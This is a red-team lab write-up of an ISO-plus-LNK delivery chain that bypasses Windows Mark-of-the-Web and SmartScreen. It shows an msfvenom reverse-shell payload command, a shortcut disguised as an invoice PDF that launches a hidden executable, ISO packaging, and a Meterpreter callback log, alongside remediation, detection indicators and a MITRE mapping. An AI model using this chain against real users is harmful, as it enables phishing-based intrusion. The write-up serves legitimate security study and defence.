> **English** | [Italiano](README.md)

# ISO + LNK Delivery - Mark-of-the-Web Bypass Chain

> - **Phase:** Social Engineering - Payload Delivery via Container File (Post-Macro Kill)
> - **Visibility:** Medium - the ISO file can be analyzed by advanced sandboxes, but the MotW bypass evades SmartScreen and macro blocking; LNK files with suspicious parameters are detectable by EDR with specific rules
> - **Prerequisites:** msfvenom for payload generation; `mkisofs`/`genisoimage` for ISO creation; knowledge of Windows LNK structure; Metasploit handler listening
> - **Output:** SE-009 (payload executed without Mark-of-the-Web, SmartScreen bypass - severity Critical)

- **Operating Environment:** Kali Linux Purple (Attacker), Windows 10 22H2 VM (Victim)
- **Target:** User opening ISO file received via email or link
- **Documented Techniques:** ISO Container Mounting, LNK Shortcut Abuse, MotW Bypass, SmartScreen Evasion

---

## Executive Summary

After Microsoft blocked VBA macros by default for files with Mark-of-the-Web (July 2022), attackers rapidly adopted a new delivery chain based on container files: ISO (disk image), IMG, and VHD. The exploited principle is a gap in the Windows security model: when an ISO file is mounted as a virtual drive, the files contained within it do not inherit the Mark-of-the-Web from the parent ISO file. This means that a payload or LNK inside the ISO is executed without SmartScreen or macro blocking intervention.

The documented chain - an ISO file containing a LNK disguised as a document and the hidden payload - was the primary delivery vector for Bumblebee, Qakbot, IcedID, and other loaders in 2022-2023. Microsoft partially mitigated the issue in subsequent updates (MotW propagation to mounted files), but the technique remains effective on unpatched systems and with variants (VHD, 7z, nested containers).

---

## ISO + LNK: Payload Execution without MotW

**Finding ID:** `SE-009` | **Severity:** `Critical`

### Operational Context

The lab built a complete delivery chain: an ISO file containing a LNK (Windows shortcut) with a PDF document icon and a hidden .exe payload (hidden attribute). When the victim opens the ISO file, Windows mounts it as a virtual drive (e.g., `D:`). The victim sees an apparent "Fattura.pdf" (actually the LNK), opens it, and the LNK executes the hidden payload. SmartScreen does not intervene because files on the mounted drive have no MotW.

### PoC - Phase 1: Payload Creation

```Bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o payload.exe
```

```
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
```

### PoC - Phase 2: ISO Content Preparation

```Bash
# Creating directory structure for ISO
mkdir -p /tmp/iso_build
cp payload.exe /tmp/iso_build/

# LNK file creation (on Windows VM or with pylnk3 on Linux)
# The LNK must:
# - Have a PDF icon (shell32.dll, icon #19)
# - Name: "Fattura_Q1_2026.pdf.lnk" (.lnk extension hidden by default)
# - Target: "cmd.exe /c start payload.exe"
```

```Bash
# Alternative: LNK creation with PowerShell (on Windows VM)
# $ws = New-Object -ComObject WScript.Shell
# $lnk = $ws.CreateShortcut("D:\Fattura_Q1_2026.pdf.lnk")
# $lnk.TargetPath = "cmd.exe"
# $lnk.Arguments = "/c start payload.exe"
# $lnk.IconLocation = "shell32.dll,19"
# $lnk.Save()
```

### PoC - Phase 3: ISO Image Creation

```Bash
# Set hidden attribute on payload
# (in Windows environment: attrib +h payload.exe)

# ISO creation
mkisofs -o fattura_documents.iso -J -r /tmp/iso_build/
```

```
Total translation table size: 0
Total rockridge attributes bytes: 0
Total directory bytes: 0
Path table size(bytes): 10
Max brk space used 0
7168 extents written (14 MB)                                <-- ISO created
```

### PoC - Phase 4: MotW Absence Verification

```Bash
# On the Windows machine, after downloading the ISO file:
# Verify MotW on the ISO file itself
powershell -c "Get-Content -Path 'C:\Users\victim\Downloads\fattura_documents.iso' -Stream Zone.Identifier"
```

```
[ZoneTransfer]
ZoneId=3                                                    <-- MotW present on ISO (downloaded from Internet)
```

```Bash
# After mounting the ISO (double-click):
# Verify MotW on files INSIDE the mounted drive
powershell -c "Get-Content -Path 'D:\payload.exe' -Stream Zone.Identifier"
```

```
Get-Content : Could not open the alternate data stream 'Zone.Identifier'    <-- NO MotW!
                                                                             <-- SE-009: bypass confirmed
```

### PoC - Phase 5: Execution and Callback

```
# The victim double-clicks "Fattura_Q1_2026.pdf" (the LNK):
# 1. cmd.exe starts (hidden)
# 2. payload.exe is executed
# 3. SmartScreen does NOT intervene (no MotW on the file)

[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.120:49903)    <-- SE-009
meterpreter > getuid
Server username: DESKTOP-LAB\mario.rossi
```

### Remediation

- **Immediate action:** isolate the machine; terminate the cmd.exe/payload.exe process; check for persistence and lateral movement
- **Structural action:** apply Windows updates that propagate MotW to files mounted from ISO/VHD (KB5006674 and later); configure ASR rule `Block executable files from running unless they meet a prevalence, age, or trusted list criterion`; block automatic mounting of ISO/IMG/VHD files via Group Policy (`Administrative Templates > Windows Components > AutoPlay Policies`); deploy EDR with specific rules for child processes of explorer.exe launched from mounted virtual drives
- **Verification:** attempt to execute .exe from a mounted ISO - SmartScreen must intervene if updates are applied; verify ASR rule trigger in Microsoft Defender logs

---

## Lab Experience

The environment was configured with Windows 10 22H2 without the updates that propagate MotW to mounted files, to simulate the vulnerability window that characterized 2022-2023. The first attempt used an ISO with only the visible payload .exe: the victim could clearly see an executable, making the attack unconvincing. The second iteration introduced the LNK file with a PDF icon and the payload with the hidden attribute, achieving a result visually identical to a legitimate document.

The MotW absence verification was the most instructive moment: the `Get-Content -Stream Zone.Identifier` command returns an explicit error when the file lacks the Zone.Identifier alternate data stream, confirming that Windows does not propagate MotW from the ISO file to the files contained in the mounted drive. This is a consequence of the implementation: the ISO is mounted as a CDFS/UDF filesystem that does not support NTFS alternate data streams.

A critical aspect discovered during testing: the `.lnk` extension is not visible by default in Windows Explorer (even with "Show extensions" enabled), making the file `Fattura_Q1_2026.pdf.lnk` indistinguishable from a real PDF.

---

## Theoretical Analysis: The MotW Model and Its Limitations

The Mark-of-the-Web is a security mechanism implemented as an NTFS Alternate Data Stream (ADS) named `Zone.Identifier`. When a file is downloaded from the Internet (zone 3), Windows writes an ADS with the ZoneId indicating the origin. SmartScreen, macro blocking, and other Windows defenses consult this flag to decide whether to apply restrictions.

The architectural problem exploited by this technique is twofold:

1. **Non-NTFS filesystems do not support ADS:** when an ISO file is mounted, Windows creates a virtual drive with CDFS or UDF filesystem. These filesystems do not support NTFS alternate data streams, therefore MotW cannot be written on the contained files.

2. **MotW propagation was not implemented:** until the corrective updates, Windows did not automatically propagate MotW from the container (ISO) to extracted/mounted files.

This gap was systematically exploited in 2022-2023 by major malware loaders (Bumblebee, Qakbot, IcedID, Emotet). Microsoft's response was twofold: MotW propagation to files extracted from containers (2022-2023 updates) and introduction of additional restrictions on automatic ISO file mounting (Windows 11 23H2+). However, the chain remains effective on unpatched systems - a significant window in enterprise environments with slow patching cycles.

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement.

### Attacker Perspective (Red Team)

**Starting point:** reverse shell from ISO+LNK without SmartScreen alerts (SE-009).

**Projected kill chain:**

```
[SE-009] ISO+LNK delivery -> payload executed without MotW
        |
        v
Meterpreter session -> process migration to svchost.exe
        |
        v
Persistence -> scheduled task / registry run key
        |
        v
Credential Access -> LSASS dump / SAM extraction
        |
        v
Lateral Movement -> Domain Controller compromise
```

**Potential impact:** the absence of SmartScreen alerts means the attack does not generate initial security logs, delaying detection. In an organization with slow patching and without advanced EDR, the average dwell time can exceed 200 days (Mandiant M-Trends 2024).

### Defender Perspective (Blue Team)

**IOCs to monitor:**
- ISO/IMG/VHD file mount from Downloads directory (Sysmon Event ID 12/13)
- Execution of .exe from a drive letter other than C: (mounted drive)
- cmd.exe/powershell.exe process as child of explorer.exe with path on virtual drive
- LNK files with suspicious targets (cmd.exe /c, powershell.exe, mshta.exe)

**Hardening:**
- Block ISO/VHD mount for standard users (GPO AutoPlay)
- ASR rule for processes from non-standard drives
- EDR rule: alert on execution from removable/virtual drives without MotW

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | Creation of ISO + LNK + hidden payload delivery chain |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | ISO file sent as attachment or download link |
| Execution | User Execution: Malicious File | `T1204.002` | Victim mounts ISO and clicks LNK disguised as PDF (SE-009) |
| Defense Evasion | Subvert Trust Controls: Mark-of-the-Web Bypass | `T1553.005` | Files on mounted drive have no MotW, SmartScreen does not intervene |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | `T1036.005` | LNK named "Fattura_Q1_2026.pdf" with PDF icon |
| Defense Evasion | Hide Artifacts: Hidden Files and Directories | `T1564.001` | Payload with hidden attribute in ISO filesystem |
| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter on port 4444 |

---

> **Note:** All documented activities were conducted in a virtualized lab environment. ISO files and payloads were tested exclusively on virtual machines owned by the author. No files were distributed to real people or systems.
